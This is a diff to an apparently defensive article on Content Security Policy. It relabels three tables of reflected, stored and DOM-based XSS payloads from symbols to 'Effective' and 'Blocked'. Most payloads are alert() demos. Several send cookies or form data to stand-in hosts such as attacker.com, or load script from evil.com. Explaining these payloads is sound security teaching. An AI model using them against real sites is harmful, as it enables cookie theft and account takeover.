@@ -32,46 +32,46 @@ Before examining the effectiveness tables, let's understand the different CSP le
 
 | Attack Vector | Example Payload | No CSP | Basic CSP | Moderate CSP | Strict CSP |
 |---------------|-----------------|--------|-----------|--------------|------------|
-| Basic script tag | `<script>alert('XSS')</script>` | ✅ | ❌ | ❌ | ❌ |
-| Event handlers | `<img src="x" onerror="alert('XSS')">` | ✅ | ✅ | ❌ | ❌ |
-| JavaScript URI | `<a href="javascript:alert('XSS')">Click me</a>` | ✅ | ❌ | ❌ | ❌ |
-| Data URI | `<object data="data:text/html,<script>alert('XSS')</script>">` | ✅ | ❌ | ❌ | ❌ |
-| Inline SVG with script | `<svg onload="alert('XSS')">` | ✅ | ✅ | ❌ | ❌ |
-| CSS-based attack | `<div style="background-image: url('javascript:alert(1)')">` | ✅ | ✅ | ❌ | ❌ |
-| Meta tag refresh | `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">` | ✅ | ❌ | ❌ | ❌ |
-| Encoded JavaScript | `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E` | ✅ | ❌ | ❌ | ❌ |
-| Filter bypass | `<scr<script>ipt>alert('XSS')</script>` | ✅ | ❌ | ❌ | ❌ |
-| Remote script inclusion | `<script src="https://evil.com/xss.js"></script>` | ✅ | ✅ | ✅ | ❌ |
+| Basic script tag | `<script>alert('XSS')</script>` | Effective | Blocked | Blocked | Blocked |
+| Event handlers | `<img src="x" onerror="alert('XSS')">` | Effective | Effective | Blocked | Blocked |
+| JavaScript URI | `<a href="javascript:alert('XSS')">Click me</a>` | Effective | Blocked | Blocked | Blocked |
+| Data URI | `<object data="data:text/html,<script>alert('XSS')</script>">` | Effective | Blocked | Blocked | Blocked |
+| Inline SVG with script | `<svg onload="alert('XSS')">` | Effective | Effective | Blocked | Blocked |
+| CSS-based attack | `<div style="background-image: url('javascript:alert(1)')">` | Effective | Effective | Blocked | Blocked |
+| Meta tag refresh | `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">` | Effective | Blocked | Blocked | Blocked |
+| Encoded JavaScript | `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E` | Effective | Blocked | Blocked | Blocked |
+| Filter bypass | `<scr<script>ipt>alert('XSS')</script>` | Effective | Blocked | Blocked | Blocked |
+| Remote script inclusion | `<script src="https://evil.com/xss.js"></script>` | Effective | Effective | Effective | Blocked |
 
 ### Stored XSS Payloads
 
 | Attack Vector | Example Payload | No CSP | Basic CSP | Moderate CSP | Strict CSP |
 |---------------|-----------------|--------|-----------|--------------|------------|
-| Basic script tag | `<script>alert('XSS')</script>` | ✅ | ❌ | ❌ | ❌ |
-| Event handlers | `<img src="x" onerror="alert('XSS')">` | ✅ | ✅ | ❌ | ❌ |
-| Delayed execution | `<script>setTimeout(function(){alert('XSS')}, 2000)</script>` | ✅ | ❌ | ❌ | ❌ |
-| Blind XSS for admin | `<img src="x" onerror="fetch('/log?stolen='+document.cookie)">` | ✅ | ✅ | ❌ | ❌ |
-| JavaScript URI | `<a href="javascript:alert('XSS')">Click me</a>` | ✅ | ❌ | ❌ | ❌ |
-| HTML form injection | `<form action="https://attacker.com"><input name="stolen" value="data"></form>` | ✅ | ✅ | ✅ | ❌ |
-| Auto-submitting form | `<form action="https://attacker.com" id="xss"><input name="cookie" value="data"></form><script>document.getElementById('xss').submit()</script>` | ✅ | ❌ | ❌ | ❌ |
-| SVG animation | `<svg><animate onbegin="alert('XSS')" attributeName="x" dur="1s"></animate></svg>` | ✅ | ✅ | ❌ | ❌ |
-| Remote script inclusion | `<script src="https://evil.com/xss.js"></script>` | ✅ | ✅ | ✅ | ❌ |
-| DOM manipulation | `<div id="hack"></div><script>document.getElementById('hack').innerHTML='<img src=x onerror=alert(1)>'</script>` | ✅ | ❌ | ❌ | ❌ |
+| Basic script tag | `<script>alert('XSS')</script>` | Effective | Blocked | Blocked | Blocked |
+| Event handlers | `<img src="x" onerror="alert('XSS')">` | Effective | Effective | Blocked | Blocked |
+| Delayed execution | `<script>setTimeout(function(){alert('XSS')}, 2000)</script>` | Effective | Blocked | Blocked | Blocked |
+| Blind XSS for admin | `<img src="x" onerror="fetch('/log?stolen='+document.cookie)">` | Effective | Effective | Blocked | Blocked |
+| JavaScript URI | `<a href="javascript:alert('XSS')">Click me</a>` | Effective | Blocked | Blocked | Blocked |
+| HTML form injection | `<form action="https://attacker.com"><input name="stolen" value="data"></form>` | Effective | Effective | Effective | Blocked |
+| Auto-submitting form | `<form action="https://attacker.com" id="xss"><input name="cookie" value="data"></form><script>document.getElementById('xss').submit()</script>` | Effective | Blocked | Blocked | Blocked |
+| SVG animation | `<svg><animate onbegin="alert('XSS')" attributeName="x" dur="1s"></animate></svg>` | Effective | Effective | Blocked | Blocked |
+| Remote script inclusion | `<script src="https://evil.com/xss.js"></script>` | Effective | Effective | Effective | Blocked |
+| DOM manipulation | `<div id="hack"></div><script>document.getElementById('hack').innerHTML='<img src=x onerror=alert(1)>'</script>` | Effective | Blocked | Blocked | Blocked |
 
 ### DOM-based XSS Payloads
 
 | Attack Vector | Example Payload | No CSP | Basic CSP | Moderate CSP | Strict CSP |
 |---------------|-----------------|--------|-----------|--------------|------------|
-| URL fragment injection | `#<img src=x onerror=alert('XSS')>` | ✅ | ✅ | ❌ | ❌ |
-| Location manipulation | `javascript:alert('XSS')` | ✅ | ❌ | ❌ | ❌ |
-| Script context breaking | `');alert('XSS');//` | ✅ | ✅ | ❌ | ❌ |
-| innerHTML exploitation | `<img src=x onerror=alert('XSS')>` | ✅ | ✅ | ❌ | ❌ |
-| eval() injection | `eval('alert("XSS")')` | ✅ | ✅ | ✅ | ❌ |
-| setTimeout/setInterval | `setTimeout("alert('XSS')",100)` | ✅ | ✅ | ❌ | ❌ |
-| document.write | `document.write('<script>alert("XSS")</script>')` | ✅ | ❌ | ❌ | ❌ |
-| dangerouslySetInnerHTML | `<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert('XSS')>"}}></div>` | ✅ | ✅ | ❌ | ❌ |
-| JSON.parse + eval | `JSON.parse('{"exec":"alert(1)"}').exec` | ✅ | ✅ | ✅ | ❌ |
-| Event listeners | `element.addEventListener('load', ()=>alert('XSS'))` | ✅ | ✅ | ✅ | ❌ |
+| URL fragment injection | `#<img src=x onerror=alert('XSS')>` | Effective | Effective | Blocked | Blocked |
+| Location manipulation | `javascript:alert('XSS')` | Effective | Blocked | Blocked | Blocked |
+| Script context breaking | `');alert('XSS');//` | Effective | Effective | Blocked | Blocked |
+| innerHTML exploitation | `<img src=x onerror=alert('XSS')>` | Effective | Effective | Blocked | Blocked |
+| eval() injection | `eval('alert("XSS")')` | Effective | Effective | Effective | Blocked |
+| setTimeout/setInterval | `setTimeout("alert('XSS')",100)` | Effective | Effective | Blocked | Blocked |
+| document.write | `document.write('<script>alert("XSS")</script>')` | Effective | Blocked | Blocked | Blocked |
+| dangerouslySetInnerHTML | `<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert('XSS')>"}}></div>` | Effective | Effective | Blocked | Blocked |
+| JSON.parse + eval | `JSON.parse('{"exec":"alert(1)"}').exec` | Effective | Effective | Effective | Blocked |
+| Event listeners | `element.addEventListener('load', ()=>alert('XSS'))` | Effective | Effective | Effective | Blocked |
 
 ## Key Differences Between XSS Types
 
